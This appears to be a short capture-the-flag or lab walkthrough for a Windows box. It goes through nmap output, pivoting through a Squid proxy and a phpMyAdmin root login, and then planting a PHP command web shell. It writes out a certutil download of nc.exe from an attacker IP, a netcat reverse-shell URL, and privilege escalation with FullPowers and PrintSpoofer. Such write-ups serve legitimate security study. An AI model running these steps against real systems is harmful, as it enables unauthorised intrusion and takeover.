PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-25T08:59:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 25 05:00:23 2026 -- 1 IP address (1 host up) scanned in 56.11 seconds


port 3128 running squid 4.14
<img width="750" height="514" alt="image" src="https://github.com/user-attachments/assets/182b5711-4cb2-424f-896d-303c8af48b93" />

using https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
find open ports 8080 on proxy
<img width="605" height="114" alt="image" src="https://github.com/user-attachments/assets/09c279b1-8c3e-4aec-8c86-546a984aa718" />

foxyproxy add the proxy
<img width="1257" height="583" alt="image" src="https://github.com/user-attachments/assets/392a393f-6c4e-4dac-8f1d-a86427d572b8" />

activate proxy and go to port 8080
<img width="1563" height="813" alt="image" src="https://github.com/user-attachments/assets/4ec2011c-8888-4e80-8c4b-96153ede4a2c" />

in phpinfo the document root is c:/wamp/www
<img width="806" height="91" alt="image" src="https://github.com/user-attachments/assets/8d823b58-1c7a-4670-9262-038752fce12f" />

phpmyadmin logged in by root: but no user info found

put a cmd into the root path 
<img width="718" height="236" alt="image" src="https://github.com/user-attachments/assets/17ae837d-bea0-4304-bf3d-b0a94c001183" />
<img width="946" height="417" alt="image" src="https://github.com/user-attachments/assets/f31149cd-7e07-4cc9-9385-630ff314c72f" />

whoami
<img width="879" height="173" alt="image" src="https://github.com/user-attachments/assets/2038de60-2f12-4589-9d8c-7962af730c1d" />

certutil -urlcache -split -f http://192.168.45.175/nc.exe nc.exe
<img width="1127" height="183" alt="image" src="https://github.com/user-attachments/assets/b0b0d5ab-9d64-4142-ad8f-bda5bb330a60" />
<img width="1900" height="267" alt="image" src="https://github.com/user-attachments/assets/e76dff41-17d5-46dc-a60d-dac74af2f8ad" />

http://192.168.173.189:8080/cmd.php?cmd=nc.exe e cmd.exe 192.168.45.175 443
<img width="319" height="77" alt="image" src="https://github.com/user-attachments/assets/4adadc6e-19fe-4f14-847b-1a1ef7de694a" />

use fullpowers to get privs
<img width="618" height="110" alt="image" src="https://github.com/user-attachments/assets/7e593d97-6e65-40f0-8e44-04ac36a002a1" />
<img width="870" height="404" alt="image" src="https://github.com/user-attachments/assets/721abdf4-dad6-4f70-81ef-fc5653dcde94" />

PRINTSPOOFER
<img width="634" height="201" alt="image" src="https://github.com/user-attachments/assets/df8aef56-607a-4773-a558-480564ea0d40" />

